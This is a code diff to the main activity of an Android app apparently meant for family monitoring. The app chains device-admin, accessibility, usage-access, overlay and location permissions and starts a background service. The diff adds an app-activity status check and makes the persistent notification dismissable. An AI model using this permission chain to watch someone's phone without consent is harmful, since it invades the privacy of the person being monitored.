@@ -43,6 +43,7 @@ import android.widget.Toast;
 
 import android.os.Bundle;
 
+import com.family.AppActivity.AppActivityService;
 import com.family.accessibility.MyAccessibilityService;
 import com.family.adminstrator.Adminstrator;
 import com.family.background.GoogleService;
@@ -90,6 +91,10 @@ public class MainActivity extends FragmentActivity implements OnMapReadyCallback
         simplePermissions();
         drawAppPermission();
 
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            AppActivityService.getStatus(this);
+        }
+
 
     }
 
@@ -99,9 +104,9 @@ public class MainActivity extends FragmentActivity implements OnMapReadyCallback
                 .setSmallIcon(R.mipmap.ic_launcher)
                 .setContentTitle("content title")
                 .setContentText("content text")
-                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-                .setAutoCancel(false)
-                .setOngoing(true);
+                .setPriority(NotificationCompat.PRIORITY_DEFAULT);
+//                .setAutoCancel(false)
+//                .setOngoing(true);
         createNotificationChannel();
 
 
@@ -243,30 +248,17 @@ public class MainActivity extends FragmentActivity implements OnMapReadyCallback
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        Log.d("salam", "0-------");
-        //LocationService L = new LocationService(this);
         startService(new Intent(getApplicationContext(), GoogleService.class));
         if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
 
         }else {
-            //Log.d("salam", "not garanted - " + p[i]);
-//            ActivityCompat.requestPermissions(this,
-//                    permissions,
-//                    1);
+
         }
     }
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
 
-//        if (requestCode == 1) {
-//            if(resultCode == Activity.RESULT_OK){
-//                String result=data.getStringExtra("result");
-//            }
-//            if (resultCode == Activity.RESULT_CANCELED) {
-//                //Write your code if there's no result
-//            }
-//        }
         if(requestCode == DRAW) {
             setUssage();
         }else if(requestCode == USSAGE) {
@@ -278,10 +270,9 @@ public class MainActivity extends FragmentActivity implements OnMapReadyCallback
         }else if(requestCode == ADMIN) {
             setAccesibiltyOn();
         }else if(requestCode == ACCESIBILITY) {
-            //simplePermissions();
         }
         Log.d("salam","result came" + requestCode);
-    }//onActivityResult
+    }
 
 
     @Override
